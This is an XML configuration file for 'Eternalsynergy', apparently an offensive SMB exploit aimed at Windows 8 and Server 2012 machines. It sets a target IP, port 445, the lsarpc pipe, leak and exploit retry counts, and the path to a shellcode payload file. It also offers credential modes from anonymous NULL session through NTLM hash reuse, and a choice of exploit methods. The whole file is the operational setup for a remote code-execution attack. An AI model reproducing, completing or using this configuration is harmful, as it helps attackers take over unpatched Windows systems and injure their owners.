<t:config xmlns:t="urn:trch" id="665a77d7870f1e8dc34048203dc820525c09bd23" configversion="1.0.1.0" name="Eternalsynergy" version="1.0.1" schemaversion="2.1.0">
<t:inputparameters>
<t:parameter name="NetworkTimeout" description="Timeout for blocking network calls (in seconds).  Use -1 for no timeout." type="S16" format="Scalar" valid="true">
<t:default>60</t:default>
<t:value>60</t:value>
</t:parameter>
<t:parameter name="TargetIp" description="Target IP Address" type="IPv4" format="Scalar" valid="true">
<t:value>10.0.0.121</t:value>
</t:parameter>
<t:parameter name="TargetPort" description="Target TCP port" type="TcpPort" format="Scalar" valid="true">
<t:default>445</t:default>
<t:value>445</t:value>
</t:parameter>
<t:parameter name="MaxLeakAttempts" description="Number of tries to exploit. Default 7" type="U32" format="Scalar" hidden="true" valid="true">
<t:default>7</t:default>
<t:value>7</t:value>
</t:parameter>
<t:parameter name="MaxExploitAttempts" description="Number of tries to exploit. Default 3" type="U32" format="Scalar" hidden="true" valid="true">
<t:default>3</t:default>
<t:value>3</t:value>
</t:parameter>
<t:parameter name="AttemptIndex" description="How many times ETSY has already been used against this target (0-7)" type="U32" format="Scalar" valid="true">
<t:default>0</t:default>
<t:value>0</t:value>
</t:parameter>
<t:parameter name="ManyCoreTarget" description="Boolean specifying if the target is assumed to have many (8 or more) cores, physical or virtual" type="Boolean" format="Scalar" valid="true">
<t:default>0</t:default>
<t:value>false</t:value>
</t:parameter>
<t:parameter name="PipeName" description="The named pipe to use" type="String" format="Scalar" valid="true">
<t:value>lsarpc</t:value>
</t:parameter>
<t:parameter name="ShellcodeFile" description="DOPU (x64 version!) ONLY! Other shellcode will likely BSOD." type="LocalFile" format="Scalar" valid="true">
<t:value>c:\ops\payloads\x64.shellcode.output</t:value>
</t:parameter>
<t:paramchoice name="ExploitMethod" description="Which exploit method to use">
<t:default>Default</t:default>
<t:value>Default</t:value>
<t:paramgroup name="Default" description="Use the best exploit method(s) for the target OS">
<t:parameter name="ExploitMethodChoice" description="" type="U32" format="Scalar" hidden="true" valid="true">
<t:default>0</t:default>
<t:value>0</t:value>
</t:parameter>
</t:paramgroup>
<t:paramgroup name="Matched-pairs" description="More reliable">
<t:parameter name="ExploitMethodChoice" description="" type="U32" format="Scalar" hidden="true" valid="true">
<t:default>1</t:default>
<t:value>1</t:value>
</t:parameter>
</t:paramgroup>
<t:paramgroup name="Classic-Synergy" description="Less reliable">
<t:parameter name="ExploitMethodChoice" description="" type="U32" format="Scalar" hidden="true" valid="true">
<t:default>2</t:default>
<t:value>2</t:value>
</t:parameter>
</t:paramgroup>
</t:paramchoice>
<t:paramchoice name="Credentials" description="Type of credentials to use">
<t:default>Anonymous</t:default>
<t:value>Anonymous</t:value>
<t:paramgroup name="Anonymous" description="Anonymous (NULL session)">
<t:parameter name="CredChoice" description="" type="U32" format="Scalar" hidden="true" valid="true">
<t:default>0</t:default>
<t:value>0</t:value>
</t:parameter>
<t:parameter name="Username" description="" type="Buffer" format="Scalar" hidden="true" valid="true">
<t:default></t:default>
<t:value></t:value>
</t:parameter>
<t:parameter name="Password" description="" type="Buffer" format="Scalar" hidden="true" valid="true">
<t:default></t:default>
<t:value></t:value>
</t:parameter>
</t:paramgroup>
<t:paramgroup name="Guest" description="Guest account">
<t:parameter name="CredChoice" description="" type="U32" format="Scalar" hidden="true" valid="true">
<t:default>2</t:default>
<t:value>2</t:value>
</t:parameter>
<t:parameter name="Username" description="" type="Buffer" format="Scalar" hidden="true" valid="false">
<t:default>Guest</t:default>
<t:value>Guest</t:value>
</t:parameter>
<t:parameter name="Password" description="" type="Buffer" format="Scalar" hidden="true" valid="true">
<t:default></t:default>
<t:value></t:value>
</t:parameter>
</t:paramgroup>
<t:paramgroup name="Blank" description="User account with no password set">
<t:parameter name="CredChoice" description="" type="U32" format="Scalar" hidden="true" valid="true">
<t:default>2</t:default>
<t:value>2</t:value>
</t:parameter>
<t:parameter name="Username" description="Username entered as hex bytes (in unicode)" type="Buffer" format="Scalar"></t:parameter>
<t:parameter name="Password" description="" type="Buffer" format="Scalar" hidden="true" valid="true">
<t:default></t:default>
<t:value></t:value>
</t:parameter>
</t:paramgroup>
<t:paramgroup name="Password" description="User name and password">
<t:parameter name="CredChoice" description="" type="U32" format="Scalar" hidden="true" valid="true">
<t:default>3</t:default>
<t:value>3</t:value>
</t:parameter>
<t:parameter name="Username" description="Username entered as hex bytes (in unicode)" type="Buffer" format="Scalar"></t:parameter>
<t:parameter name="Password" description="Password entered as hex bytes (in unicode)" type="Buffer" format="Scalar"></t:parameter>
</t:paramgroup>
<t:paramgroup name="NTLM" description="User name and NT and/or LM hash">
<t:parameter name="CredChoice" description="" type="U32" format="Scalar" hidden="true" valid="true">
<t:default>4</t:default>
<t:value>4</t:value>
</t:parameter>
<t:parameter name="Username" description="Username entered as hex bytes (in unicode)" type="Buffer" format="Scalar"></t:parameter>
<t:parameter name="ntHash" description="NT password hash (in hex), or blank to use LM hash" type="Buffer" format="Scalar" valid="true">
<t:default></t:default>
<t:value></t:value>
</t:parameter>
<t:parameter name="lmHash" description="LM password hash (in hex), or blank to use NT hash" type="Buffer" format="Scalar" valid="true">
<t:default></t:default>
<t:value></t:value>
</t:parameter>
</t:paramgroup>
</t:paramchoice>
<t:paramchoice name="Protocol" description="SMB (default port 445) or NBT (default port 139)">
<t:default>SMB</t:default>
<t:value>SMB</t:value>
<t:paramgroup name="SMB" description="">
<t:parameter name="UsingNbt" description="Boolean stating to use Nbt or not" type="Boolean" format="Scalar" hidden="true" valid="true">
<t:default>0</t:default>
<t:value>false</t:value>
</t:parameter>
</t:paramgroup>
<t:paramgroup name="NBT" description="">
<t:parameter name="UsingNbt" description="Boolean stating to use Nbt or not" type="Boolean" format="Scalar" hidden="true" valid="true">
<t:default>1</t:default>
<t:value>true</t:value>
</t:parameter>
</t:paramgroup>
</t:paramchoice>
<t:paramchoice name="Target" description="Operating System, Service Pack, of target OS">
<t:value>SERVER_2K12_SP0</t:value>
<t:paramgroup name="WIN8_SP0" description="Windows 8 Sp0, 64-bit">
<t:parameter name="OsMajor" description="OS Major Version" type="U8" format="Scalar" hidden="true" valid="true">
<t:default>6</t:default>
<t:value>6</t:value>
</t:parameter>
<t:parameter name="OsMinor" description="OS Minor Version" type="U8" format="Scalar" hidden="true" valid="true">
<t:default>2</t:default>
<t:value>2</t:value>
</t:parameter>
<t:parameter name="OsServicePack" description="OS Service Pack Level" type="U8" format="Scalar" hidden="true" valid="true">
<t:default>0</t:default>
<t:value>0</t:value>
</t:parameter>
</t:paramgroup>
<t:paramgroup name="SERVER_2K12_SP0" description="Windows Server 2012 Sp0, 64-bit">
<t:parameter name="OsMajor" description="OS Major Version" type="U8" format="Scalar" hidden="true" valid="true">
<t:default>6</t:default>
<t:value>6</t:value>
</t:parameter>
<t:parameter name="OsMinor" description="OS Minor Version" type="U8" format="Scalar" hidden="true" valid="true">
<t:default>2</t:default>
<t:value>2</t:value>
</t:parameter>
<t:parameter name="OsServicePack" description="OS Service Pack Level" type="U8" format="Scalar" hidden="true" valid="true">
<t:default>0</t:default>
<t:value>0</t:value>
</t:parameter>
</t:paramgroup>
</t:paramchoice>
</t:inputparameters>
<t:outputparameters>
<t:parameter name="TargetOsArchitecture" description="The architecture of the target operating system" type="Buffer" format="Scalar"></t:parameter>
</t:outputparameters>
</t:config>
